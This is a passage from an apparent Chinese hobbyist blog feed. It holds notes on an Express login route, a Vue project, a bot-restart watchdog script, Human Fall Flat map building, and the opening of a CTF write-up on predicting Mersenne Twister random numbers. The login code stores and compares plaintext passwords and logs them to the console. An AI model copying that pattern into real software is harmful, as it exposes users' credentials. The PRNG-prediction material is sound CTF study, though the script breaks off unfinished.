punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">results<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span>         <span class="token punctuation">&#123;</span>            <span class="token comment">//在这里写验证代码</span>            <span class="token keyword">let</span> realpass <span class="token operator">=</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"PASSWORD"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>password <span class="token operator">==</span> realpass<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">res</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"密码正确"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token function">res</span><span class="token punctuation">(</span><span class="token string">"failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"密码错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> promise<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    </p><h3 id="Express做服务端路由解析"><a href="#Express做服务端路由解析" class="headerlink" title="Express做服务端路由解析"></a>Express做服务端路由解析</h3><p>​    好了，接下来加入express模块来做路由。<code>npm install express</code></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;* *使用express做路由解析*&#x2F;const express &#x3D; require(&#39;express&#39;);const app &#x3D; express();const port &#x3D; 8000;app.listen(port, () &#x3D;&gt; &#123;  console.log(&#39;We are live on &#39; + port);&#125;);&#x2F;&#x2F;url解析app.use(express.urlencoded(&#123; extended: true &#125;));&#x2F;&#x2F;登录验证模块app.post(&#39;&#x2F;login&#39;, function(req, res) &#123;    let body &#x3D; req.body;    let username &#x3D; body[&quot;username&quot;];    let password &#x3D; body[&quot;password&quot;];    VertifyUser(username, password).then((results, reject) &#x3D;&gt; &#123;        res.send(results);    &#125;);&#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Error-Cannot-enqueue-Handshake-after-invoking-quit-的解决方案"><a href="#Error-Cannot-enqueue-Handshake-after-invoking-quit-的解决方案" class="headerlink" title="Error: Cannot enqueue Handshake after invoking quit.的解决方案"></a>Error: Cannot enqueue Handshake after invoking quit.的解决方案</h3><p>​    这个是因为mysql没给重新连上去导致的，这里直接把连接封装成一个类然后每次调用即可。</p><p><a href="https://blog.csdn.net/m0_37869769/article/details/97822622">CSDN上的解决方案</a></p><h2 id="一些关于JQuery的知识点"><a href="#一些关于JQuery的知识点" class="headerlink" title="一些关于JQuery的知识点"></a>一些关于JQuery的知识点</h2><h3 id="JQuery加载的四种写法"><a href="#JQuery加载的四种写法" class="headerlink" title="JQuery加载的四种写法"></a>JQuery加载的四种写法</h3><blockquote><p><a href="https://blog.csdn.net/msdn_make/article/details/102615958?utm_term=jquery%E6%96%87%E4%BB%B6%E5%86%99%E6%B3%95&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-102615958&amp;spm=3001.4430">https://blog.csdn.net/msdn_make/article/details/102615958?utm_term=jquery%E6%96%87%E4%BB%B6%E5%86%99%E6%B3%95&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-102615958&amp;spm=3001.4430</a></p></blockquote><p><img src="/2021/11/03/Electron%E5%88%9D%E4%BD%93%E9%AA%8C/image-20211105135111317.png" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vue服务器内容管理网站项目</title>
      <link href="2021/10/31/vue%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%BD%91%E7%AB%99%E9%A1%B9%E7%9B%AE/"/>
      <url>2021/10/31/vue%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%BD%91%E7%AB%99%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    因为我的qqbot在运行的时候，经常性的掉线，因为各种各种的原因有了这个个性化的在线的服务器内容管理网站的需求。主要用来，在手边没有电脑的情况下进行服务器的各种内容的管理。</p><h2 id="实现框架"><a href="#实现框架" class="headerlink" title="实现框架"></a>实现框架</h2><pre class="line-numbers language-none"><code class="language-none">vue(ElementUi) + nodejs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    因为没有、也不需要存储的功能，所以这个网站基本上用不到数据库，需要用的话，可以用yaml文件来存放各种对于服务器的配置。</p><h2 id="功能需求"><a href="#功能需求" class="headerlink" title="功能需求"></a>功能需求</h2><h1 id="Vue安装使用"><a href="#Vue安装使用" class="headerlink" title="Vue安装使用"></a>Vue安装使用</h1><h2 id="安装vue-cli脚手架"><a href="#安装vue-cli脚手架" class="headerlink" title="安装vue/cli脚手架"></a>安装vue/cli脚手架</h2><pre class="line-numbers language-none"><code class="language-none">npm install -g @vue&#x2F;cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建vue项目"><a href="#创建vue项目" class="headerlink" title="创建vue项目"></a>创建vue项目</h2><pre class="line-numbers language-none"><code class="language-none">vue create qqbotmanager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    提示如下：</p><pre class="line-numbers language-none"><code class="language-none">🎉  Successfully created project qqbotmanager.👉  Get started with the following commands: $ cd qqbotmanager $ npm run serve<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    直接按他的执行能成功运行起来就可以了。</p><h2 id="修改默认的端口号"><a href="#修改默认的端口号" class="headerlink" title="修改默认的端口号"></a>修改默认的端口号</h2><p>在项目主目录下的package.json文件夹下面的<code>&quot;scripts&quot;</code>键下的<code>serve</code>键的值改为<code>vue-cli-service serve --port 1001</code></p><h1 id="ElementUi安装使用"><a href="#ElementUi安装使用" class="headerlink" title="ElementUi安装使用"></a>ElementUi安装使用</h1><h2 id="两种方式使用框架"><a href="#两种方式使用框架" class="headerlink" title="两种方式使用框架"></a>两种方式使用框架</h2><p>​    第一种方式是直接在head标签里面加一个标签来引入，这种方法十分方便，但是我作为一个新手，还是做点有挑战性的工作吧。所以我采用了第二种使用这个框架的解决方案。</p><h3 id="node引入框架"><a href="#node引入框架" class="headerlink" title="node引入框架"></a>node引入框架</h3><ol><li>安装框架</li></ol><pre class="line-numbers language-none"><code class="language-none">npm install element-plus --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>框架使用。直接在框架主目录下的main.js文件里面引入即可，引入方式如下。</li></ol><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> createApp <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> ElementPlus <span class="token keyword">from</span> <span class="token string">'element-plus'</span><span class="token keyword">import</span> <span class="token string">'element-plus/dist/index.css'</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App.vue'</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">createApp</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>ElementPlus<span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="宣告失败-amp-bot上线助手"><a href="#宣告失败-amp-bot上线助手" class="headerlink" title="宣告失败&amp;bot上线助手"></a>宣告失败&amp;bot上线助手</h1><h2 id="失败原因"><a href="#失败原因" class="headerlink" title="失败原因"></a>失败原因</h2><p>​    使用前未对这个框架进行调查，发现适配手机端并不像我想象得那么简单，而且如果我做的界面很简单的话用这个东西也是可以的，但是我想要做的东西又很复杂，这个东西就显得有点鸡肋了，远远不如使用安卓或者微信小程序开发，再者qqbot我已经想好新的办法来对抗它经常性掉线的这个bug了，所以我会先用这个想法，做一个简单的bot状态检测与修复。</p><h2 id="bot下线原因列举"><a href="#bot下线原因列举" class="headerlink" title="bot下线原因列举"></a>bot下线原因列举</h2><ol><li>go-cqhttp不稳定，掉线。</li><li>我写的bot插件不稳定，掉线。</li></ol><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><ol><li><p>单独写一个状态检测脚本，每10分钟，对go-cqhttp和bot插件进行一次状态检测。</p></li><li><p>状态检测脚本代码如下：</p></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span> time<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    data1 <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'lsof -i:5701'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#返回一个list类型的结果</span>    data2 <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'lsof -i:5700'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 返回一个list类型的结果</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"nohup sudo python ../plugin/main.py > /dev/null 2>&amp;1 &amp;"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"已成功重启bot插件"</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"nohup sudo  ../go-cqhttp > /dev/null 2>&amp;1 &amp;"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"已成功重启bot"</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>人类一败涂地地图制作文档</title>
      <link href="2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3/"/>
      <url>2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>​    首先，要创建人类一败涂地的项目的话，必须使用指定的unity的版本，然后导入Unity Hub即可。下载地址：<a href="https://download.unity3d.com/download_unity/6902ad48015d/Windows64EditorInstaller/UnitySetup64-2017.4.13f1.exe?_ga=2.167398334.1681694428.1548147157-1096542433.1538500433">Unity2017.4.13f1</a> ←点击下载，人类一败涂地创意工坊必须使用2017.4.13F1版本，<strong>如果不使用2017.4.13F1版本，会出现未知BUG和不能正常使用人类一败涂地游戏资源包的问题</strong></p><p>​    创建一个普通的3D的项目即可，我把这个文件放在了我专门存放项目的盘里面了。</p><h2 id="导入人类一败涂地组件"><a href="#导入人类一败涂地组件" class="headerlink" title="导入人类一败涂地组件"></a>导入人类一败涂地组件</h2><h3 id="先安装人类一败涂地"><a href="#先安装人类一败涂地" class="headerlink" title="先安装人类一败涂地"></a>先安装人类一败涂地</h3><p>​    这个安装因为我事先已经在steam购买了这个人类一败涂地，所以直接下载安装就行了，所以如果说你没买的话，我也没尝试盗版的游戏是不是也可以进行这个导入package的操作，你也可以自己尝试一下。</p><h3 id="资源包位置-amp-导入资源包"><a href="#资源包位置-amp-导入资源包" class="headerlink" title="资源包位置&amp;导入资源包"></a>资源包位置&amp;导入资源包</h3><p>​    默认下载地址的话，资源包的位置为：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files (x86)\Steam\steamapps\common\Human Fall Flat\WorkshopPackage\Human.unitypackage<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3/image-20211028213804267.png" alt="image-20211028213804267"></p><p>​    超多资源，一键导入即可。注意：这里导入所用的时间不短，估计差不多有一盏茶的时间，趁这个时间喝杯茶刚刚好。</p><h2 id="地图主要的几个点"><a href="#地图主要的几个点" class="headerlink" title="地图主要的几个点"></a>地图主要的几个点</h2><p>​    一个关卡里面分的有几个重要的点，分别是出生点、死亡点、通观点等。那怎么找到这个关卡呢？这里可以直接搜索，如下图。圈住的那个就是我们需要使用到的关卡组件，可以直接拉到我们的场景中去。</p><p><img src="/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3/image-20211028220422961.png" alt></p><blockquote><p>出生点(InitialSpawnpoint)</p><p>死亡点(FallTrigger)</p><p>通关点(PassTrigger)</p></blockquote><h2 id="组件查找"><a href="#组件查找" class="headerlink" title="组件查找"></a>组件查找</h2><p>​    这个英文的资源包对我们英语非常差劲的人来说是非常具有理解难度的，所以有个大哥就把这些个组件的名字拿出来翻译了一下，我们想找组件的话，只需要搜索组件前面的英文名称即可。</p><pre class="line-numbers language-none"><code class="language-none">                    【全部关卡参考位置】在文件栏里找到assets 然后搜索prefabtestbeds，之后会出现一个文件夹，点击进去后会出现很多unity的图标，然后每个unity图标都是每个关卡，每个关卡都是官方的一关，拖进游戏对象栏后则可以以看，然后可以浏览游戏模组对象，记住他们的名字有利于以后做地                      如果记不住这里有文件名称；1：【阿兹特克】2：【搬运】3：【城堡】4：【圣诞节】大厅关卡5：【通全关后的字幕】6：【黑暗】7：【拆除】8：【冰】9：【豪宅】10：【山峰】11：【保龄球】大厅关卡12：【发电厂】13：【蒸汽】14：【火车】15：【水】                    【官方关卡模组名称】YellowMetalMechSmallRemoteControl1【提示-遥控器】LightGreyMetalFloorSmallBrokenRails1【断了的铁轨】LightWoodMechLargeTrainTrack1【长铁轨】LightWoodMechMediumTrainTrack1【短铁轨】DarkStoneFloorSmallImpactLocation1【散装石头】DarkGreyMetalMechLargeTrainEngine1【火车】LightGreyMetalMechLargeTrainEngineBoxCar1【火车客车】RedMetalmechLowTrainCarriage1【运输列车】RedMetalMechMediumTrainCarriage1【货箱火车】MetalMechPressureSwitchDoorwLight1【带压力板的门】MetalMechLift2Meter2Controls1【升降电梯】DarkGreyMetalBridgeLargeIndustrialCatwalkwRailingsTwin1【铁桥】YellowMetalBridgeSmallBridgeWithServoUptoFlat1【可以倒下的板子】YellowMetalMechSmallHook1【钩子】WhiteMetalBuildingSmallGreenhouseLeanTo1【火车关卡的斜墙】WhiteMetalBuildingSmallArchedGreenhouse2【火车关卡的短墙】WhiteMetalBuildingSmallArchedGreenhouse1【火车关卡的短墙】DarkStoneFloorLargeDrapingBrokenFloor1【小型斜坡】DarkWoodDecorationLargeStandAloneStereoSpeaker1【音响】DarkWoodDecorationLargeGlassTopCoffeeTable1玻璃柜台DarkGreyMetalDecorationLargeTV1【电视】LightWoodMechLargeDeadTreewRope1【带绳子的树】WhiteMetalBuildingLargeArchedGreenhouse1【火车关卡的房顶】WhiteMetalBuildingLargeArchedGreenhouse2【火车关卡的房顶2】LightWoodDecorationLargeClimbingBranches1【树枝1】LightWoodDecorationLargeClimbingBranches2【树枝2】LightWoodDecorationLargeClimbingBranches4【树枝3】LightWoodDecorationLargeClimbingBranches5【树枝4】LightWoodDecorationLargeClimbingBranches6【树枝5】LightWoodDecorationMediumClimbingBranches1【树枝6】LightWoodDecorationSmallClimbingBranches1【树枝7】FabricDecorationShortPlushSofa1【沙发】LightWoodDecorationMediumParkBench1【椅子】MetalMechMediumButtonDoor1【带按钮的门】MetalMechMedium2ButtonDoor1【按两次的门】MetalMechMedium2ButtonDoorwExitLight1【一起按的门】LightStoneBridgeMediumSinglePieceHumped1【一座桥】DarkWoodDoorMediumWoodenDouble1【木门】LightWoodMechLargeCatapult1【投石机】LightRockColumnMediumCollapsingColumn1【会倒塌的石柱】LightWoodBuildingSmallLeanToThatchedRoof1【有门的小房子】LightWoodBridgeSmallBridgeSinglePiece1【一座木桥】LightStoneStepsLargeExampleStairs1【石楼梯】LightGreyMetalMechSmallLantern1【灯笼】LightGreyMetalMechMediumDanglingLantern1【长灯笼】LightWoodContainerMediumWoodenBucket1【木桶】LightStoneWalllargeDestructibleBrick1【城墙】LightWoodMechLargeMouseWheel1【滚轮】LightWoodDoorMediumDoublewithLockRoundTop1【带锁的门】LightGreyMetalDecorationMediumBell1【钟】LightStoneWallLargeBrokenWindow1【带窟窿的窗门】LightRockMechMediumRollingRock1【一块圆石】DarkWoodBuildingLargeWindmill1【风车】LightGreyMetalMechSmallBarrelRamp1【滑坡，长长的】LightStoneBuildingMediumModernCliffSideHouse1【豪宅房子】LightWoodBuildingVillageInn1【带滑滑梯的房子】GreyStoneEdgeMediumGrassFlooringExternalCurve1【普通的绿石板】DarkWoodStepsDoubleParkourSuspendedPlanks2【会掉下去的桥】DarkStoneMechMediumBallCounterweight1【超级大铅球】LightSandStoneBridgeMediumAztecSlab1【可以推倒的石板】GreyStoneStepsLargeOvergrownStoneSteps1【青苔地形】DarkStoneDecorationGiantBobStatue1【巨型神像】LightWoodMechSmallFlamingTorch1 【火把】Crate1x1x1【普通的木箱】watersquare 【水】LightWoodMechSmallRowingBoat1【木船】WhiteMetalMechMediumSpeedboat1【快艇】DarkGreyMetalMechMediumChainwTwoEyes1【绳索】LightWoodMechLargePaddleWaterWheel1【风车】RedMetalMechLargeShippingContainerLift1【勾货大架子】RedMetalMechLargeShippingContainer1【集装箱】LightStoneBuildingLargeLighthouse1【灯塔】DarkGreyMetalDecorationSmallCagedLight1【下水道灯】LightGreyMetalMechSmallPushButton1【奇怪的红灯】DarkGreyMetalMechSmallFreighter1【游轮】DarkWoodDecorationLargeTreeWithLeavesSingleCrown3【树】DarkWoodDecorationLargeTreeWithLeaveSingleCrown4【树2】DarkWoodDecorationMediumCornerBasedTree2【树3】DarkWoodStepsMediumStairwayBroken1【断楼梯】LightSandStoneWallMediumOvergrownTopper1【青苔石板】IceDecorationLargeIcicle1【大透明冰块】DarkGreyMetalMechLargeSkiLift1【缆车】SnowDecorationLargeSnowMountain1【冰山】LightVegetationDecorationMediumSnowCovered1【雪松树】LightVegetationDecorationLargeSnowCovered2【雪松树】IceMechSmallBlock1【冰方块】DarkWoodMechSmallSledge1【雪橇】LightWoodDecorationSmallWarningSign2【警告牌】LightWoodDecorationSmallWarningSign1【禁止牌】SnowManWithGrowingHead【雪人】LightWoodMechSmallDetonator1【引爆器】RedMetalMechSmallDynamite1 (1)【炸药】LightWoodMechSmallSnowboard1【滑雪板】RedMetalMechSmallDynamite1【炸药】LightRockFloorVlargeSnowyPlatform1【小型雪山】LightRockFloorSmallSnowyPlatform1【小型雪山】DyingVegetationDecorationLargeSnowCovered1【高松树】DarkRoseWoodMechLargeSnowCannon1【吹雪的风扇】DyingVegetationDecorationMediumSnowCovered1【小松树】LightGreyMetalDecorationSmallWindow1【雪屋玻璃】LightStoneMechLargeStatueBridge1【巨人雕像】GlassMechVlargeWindowPane1【玻璃】LightStoneBoulderSmallBoulder1【小石头】DarkGreyMetalBridgeSmallIndustrialCatwalkPost1【一个棍子】YellowMetalMechSmallCradledPlatformLinkedLever1【移动搬运机器】LightStoneMechSmallDestructible1【可以砸碎的石墙】LightWoodMechLargeReel1【一个圆滚轮】LightWoodMechMediumDoorBarrier1【几个粘在墙上的木板】OrangePaperMechLargeCementBag1【沙垫】YellowMetalMechWreckingBallCrane1【小型起重机】BlueMetalDecorationLargeTsection1【下水管道】BlueMetalDecorationLargeTubeElbowSection1【下水管道】DarkGreyMetalMechMediumWreckingBall1【起重机上的铅球】GlassDoorMediumDoubleSquareTop1【玻璃门】GlassFloorLargePanel1【平面玻璃】LightGreyMetalMechLargeBreakingLongHandledLever1【会断掉的操纵杆】RedMetalMechMediumFireExtinguisher1【消防器材】<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="组件详细讲解"><a href="#组件详细讲解" class="headerlink" title="组件详细讲解"></a>组件详细讲解</h2><p>​    随便找一个组件，比如这里我找到<code>YellowMetalMechSmallCradledPlatformLinkedLever1 【移动搬运机器】</code>这个组件，一般都是分成三个部分的，一个就是直接做好的预制体，一个是模型，另一个是皮肤。应该是可以这么说的，先说模型，模型就是可以碰到的东西，但是这个东西一般是没有什么观赏效果的(因为没皮肤)；另一个是皮肤，就是可以看到，但是摸不到的东西；而预制体就是模型与皮肤的结合。应该就是这样的(其实我也不太清楚，但应该是可以这样理解的)</p><p><img src="/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3/image-20211028223753515.png" alt></p><h2 id="天空盒的制作"><a href="#天空盒的制作" class="headerlink" title="天空盒的制作"></a>天空盒的制作</h2><ol><li><p>先在project那里右键Create出来一个新的Material，命名为天空盒。</p></li><li><p>选中刚才创建出来的天空盒构件，在出现的精灵界面中修改它的Shader属性为Skybox/Panoramic</p></li><li><p>选择一张图片拖到如下图所示的位置处</p></li></ol><p><img src="/2021/10/28/%E4%BA%BA%E7%B1%BB%E4%B8%80%E8%B4%A5%E6%B6%82%E5%9C%B0%E5%9C%B0%E5%9B%BE%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3/image-20211030135414718.png" alt></p><ol><li>然后再把这个构件拉到地图上面，这个天空盒就已经是应用到这个地图上的状态了。</li><li>天空盒其他的美化之类的东西之后再学。</li></ol><h2 id="创建存档点"><a href="#创建存档点" class="headerlink" title="创建存档点"></a>创建存档点</h2><p>​    存档点也就是检查点，可以用多种方法使用，这里我只介绍一种，因为另一种我也不会，主要是没找到checkpoint这个预制件，所以只能使用稍微麻烦一点的方式来创建存档点了，下面是创建存档点的步骤</p><ol><li>先复制、粘贴一个出生点，把这个粘贴出来的出生点命名为<code>CheckPoint-1</code>即可。</li><li><p>把CheckPoint这个脚本里面的Number的值修改为<code>1</code>，按照<code>1-2-3-4...n</code>的顺序修改，一定要连续，不可跳跃（跳跃的话，那里开始跳跃的，之后的所有检查点应该都是不会生效的）。</p></li><li><p>先创建一个碰撞器(<code>Box Collider</code>)，然后再勾上trigger选项即可。</p></li></ol><h2 id="创建碰撞器"><a href="#创建碰撞器" class="headerlink" title="创建碰撞器"></a>创建碰撞器</h2><p>​    虽然已经搞过很多次了，但是记下来这个东西也没什么坏处，就是有的东西没有碰撞检测器这个东西，这时候我们的人物是可以直接穿过我们的这个模型的，这样是不行的，想解决这个问题只需要下面这一步即就行了。</p><ol><li>在原先的基础之上添加一个名叫碰撞盒(<code>Box Collider</code>)的东西，修改碰撞体的大小为合适的大小即可。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于梅森旋转伪随机数的预测</title>
      <link href="2021/10/25/%E5%85%B3%E4%BA%8E%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E9%A2%84%E6%B5%8B/"/>
      <url>2021/10/25/%E5%85%B3%E4%BA%8E%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="是时候总结一下这个知识点了"><a href="#是时候总结一下这个知识点了" class="headerlink" title="是时候总结一下这个知识点了"></a>是时候总结一下这个知识点了</h2><p>最近总爱出关于这个梅森旋转伪随机数生成方法的知识点，虽然考的内容很普通，但是最好还是写个文章记录一下脚本</p><h2 id="MT19937"><a href="#MT19937" class="headerlink" title="MT19937"></a>MT19937</h2><p><a href="https://liam.page/2018/01/12/Mersenne-twister/">https://liam.page/2018/01/12/Mersenne-twister/</a></p><p><a href="https://badmonkey.site/archives/mt19937.html">题目总结</a></p><h2 id="伪随机数预测"><a href="#伪随机数预测" class="headerlink" title="伪随机数预测"></a>伪随机数预测</h2><blockquote><p>实现：有前面的624个序列的生成数，就可以预测之后的所有的随机数，从而产生危险，下面是脚本</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    fw <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"random"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    fw<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>generate<span class="token punctuation">(</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token 